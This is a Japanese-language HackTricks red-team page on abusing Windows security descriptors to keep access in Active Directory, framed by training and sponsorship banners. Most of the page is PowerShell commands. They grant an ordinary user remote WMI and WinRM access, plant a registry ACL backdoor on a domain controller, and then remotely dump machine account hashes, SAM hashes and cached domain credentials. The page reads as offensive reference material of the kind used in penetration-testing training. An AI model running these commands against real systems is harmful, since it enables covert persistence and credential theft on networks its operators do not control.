# セキュリティ記述子

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## セキュリティ記述子

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): セキュリティ記述子定義言語 (SDDL) は、セキュリティ記述子を記述するために使用されるフォーマットを定義します。SDDLはDACLおよびSACLのためにACE文字列を使用します: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**セキュリティ記述子**は、**オブジェクト**が**持つ****権限**を**保存**するために使用されます。オブジェクトの**セキュリティ記述子**に**少しの変更**を加えることができれば、そのオブジェクトに対して非常に興味深い権限を取得することができ、特権グループのメンバーである必要はありません。

この永続性技術は、特定のオブジェクトに対して必要なすべての権限を獲得する能力に基づいており、通常は管理者権限を必要とするタスクを、管理者である必要なく実行できるようにします。

### WMIへのアクセス

ユーザーに**リモートでWMIを実行する**アクセスを与えることができます [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

**winrm PSコンソールへのアクセスをユーザーに与える** [**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### ハッシュへのリモートアクセス

**レジストリ**にアクセスし、**DAMP**を使用して**ハッシュをダンプ**し、いつでも**コンピュータのハッシュ**、**SAM**、およびコンピュータ内の任意の**キャッシュされたAD**資格情報を取得できる**Regバックドアを作成**します。したがって、これは**ドメインコントローラコンピュータ**に対して**通常のユーザー**にこの権限を与えるのに非常に便利です：
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
チェックしてみてください [**Silver Tickets**](silver-ticket.md) ドメインコントローラーのコンピューターアカウントのハッシュをどのように使用できるかを学ぶために。

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
